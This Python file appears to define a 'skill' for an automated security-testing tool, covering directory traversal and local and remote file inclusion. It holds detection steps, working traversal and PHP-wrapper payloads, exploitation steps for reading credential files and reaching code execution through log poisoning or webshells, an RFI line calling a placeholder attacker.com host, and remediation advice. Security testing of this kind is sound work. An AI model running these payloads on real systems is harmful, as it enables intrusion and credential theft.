"""Directory Traversal / Local File Inclusion (LFI) / Remote File Inclusion (RFI)."""

SKILL = {
    "id": "directory_traversal",
    "name": "Directory Traversal / LFI / RFI",
    "category": "injection",
    "severity": "critical",

    "detection": """
- Look for parameters that reference files: ?page=, ?file=, ?path=, ?template=, ?include=, ?doc=, ?lang=
- Test with path traversal sequences: ../../etc/passwd, ..\\..\\windows\\system32\\drivers\\etc\\hosts
- Test with URL encoding: %2e%2e%2f, %252e%252e%252f (double encoding)
- Test null byte injection (older PHP): ../../etc/passwd%00.jpg
- Test with path truncation: ../../../../[...long path...]/etc/passwd
- Check for LFI in PHP: ?page=php://filter/convert.base64-encode/resource=index.php
- Check for RFI (PHP allow_url_include=On): ?page=http://attacker.com/shell.txt
- Test wrapper protocols: php://input, data://, expect://, zip://
- Look for error messages revealing file paths when invalid file is requested
- Test include of log files for log poisoning: /var/log/apache2/access.log
- Check for directory traversal in file upload filename field
- Test in cookie values, HTTP headers if they are logged and included
""",

    "exploitation": """
- Read sensitive system files:
  Linux: /etc/passwd, /etc/shadow, /etc/hosts, /proc/self/environ
  Windows: C:\\boot.ini, C:\\windows\\system32\\drivers\\etc\\hosts
- Read application config: ../config.php, ../wp-config.php, ../.env, ../settings.py
- Read application source code via PHP wrappers:
  php://filter/convert.base64-encode/resource=config.php
- Log poisoning to RCE:
  1. Inject PHP code in User-Agent header
  2. Include the log file: ?page=../../var/log/apache2/access.log&cmd=id
- PHP input wrapper for RCE: POST ?page=php://input with PHP code in body
- Data wrapper: ?page=data://text/plain;base64,[base64-encoded-php]
- Chain with file upload: upload webshell, include it via LFI
- Extract database credentials from config files, pivot to database access
- Document: show contents of sensitive files read, or RCE achieved
""",

    "remediation": """
- NEVER use user input directly in file paths or include/require statements
- Use a whitelist of allowed files:
  ALLOWED = {'home': 'home.html', 'about': 'about.html', 'contact': 'contact.html'}
  page = ALLOWED.get(request.args.get('page'), 'home.html')
- Use basename() to strip path components:
  Python: os.path.basename(user_input)
  PHP: basename($user_input)
- Validate input: reject any input containing .., /, \\, %00, or protocol handlers
- PHP: set open_basedir to restrict file access to web root
  php.ini: open_basedir = /var/www/html/
- PHP: disable dangerous wrappers:
  allow_url_include = Off
  allow_url_fopen = Off
- Use chroot jail for the web application
- Set proper file permissions: web user can only read what it needs
- Disable directory listing in web server
- SSH fix: review code for include/require with user input, replace with whitelist
- SSH fix: set open_basedir and disable url_include in php.ini
- Verify: test traversal payloads again, confirm blocked
""",

    "tools": ["web_spider", "dir_bruteforce", "http_headers_check", "waf_detect"],

    "payloads": [
        "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
        "....//....//etc/passwd", "..%2f..%2f..%2fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../etc/passwd%00", "../../etc/passwd%00.jpg",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
        "expect://id", "/proc/self/environ",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/var/log/apache2/access.log", "/var/log/nginx/access.log",
    ],

    "references": [
        "OWASP A01:2021 - Broken Access Control",
        "CWE-22: Path Traversal",
        "CWE-98: Improper Control of Filename for Include/Require in PHP",
        "CWE-23: Relative Path Traversal",
        "CAPEC-126: Path Traversal",
    ],
}
